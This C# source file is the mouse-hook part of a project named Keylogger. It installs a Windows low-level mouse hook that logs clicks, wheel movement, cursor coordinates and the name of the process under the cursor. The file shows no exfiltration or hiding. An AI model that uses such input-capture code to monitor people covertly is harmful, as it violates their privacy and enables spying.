using System.Diagnostics;
using System.Runtime.InteropServices;
using static Keylogger.Helpers.InputMessageHelper;
using static Keylogger.Interop.Win32Api;

namespace Keylogger.Hooks
{
    internal static class MouseHook
    {
        public static Hookproc Hookproc => MouseHookCallback;

        public static Action<string, string, string>? LogMouseButtonsCallback;
        public static Action<string, string, string>? LogMousePositionCallback;
        public static Predicate<MouseMessage>? SelectedMouseEventPredicate;

        private static IntPtr MouseHookCallback(int code, UIntPtr wParam, IntPtr lParam)
        {
            if (code < 0 || SelectedMouseEventPredicate is null || !SelectedMouseEventPredicate.Invoke((MouseMessage)wParam))
            {
                return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
            }

            var mouseStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
            var position = $"(X:{mouseStruct.pt.x}, Y:{mouseStruct.pt.y})";
            var processName = GetProcessNameFromPoint(mouseStruct.pt);

            switch ((MouseMessage)wParam)
            {
                case MouseMessage.WM_MOUSEWHEEL:
                {
                    var wheelDelta = (short)((mouseStruct.mouseData >> 16) & 0xffff);
                    var wheelDirection = wheelDelta > 0 ? "[Wheel Forward]" : "[Wheel Backward]";
                    LogMouseButtonsCallback?.Invoke(wheelDirection, position, processName);
                    break;
                }
                case MouseMessage.WM_MOUSEMOVE:
                    LogMousePositionCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position, processName);
                    break;
                default:
                    LogMouseButtonsCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position, processName);
                    break;
            }

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        private static string GetProcessNameFromPoint(POINT point)
        {
            var hWnd = WindowFromPoint(point);
            if (hWnd == IntPtr.Zero) return string.Empty;
            
            var processIdPtr = Marshal.AllocHGlobal(sizeof(uint));
            try
            {
                _ = GetWindowThreadProcessId(hWnd, processIdPtr);
                var processId = (uint)Marshal.ReadInt32(processIdPtr);
                // Obtener el nombre del proceso
                var process = Process.GetProcessById((int)processId);
                return process.ProcessName;
            }
            finally
            {
                Marshal.FreeHGlobal(processIdPtr);
            }
        }
    }
}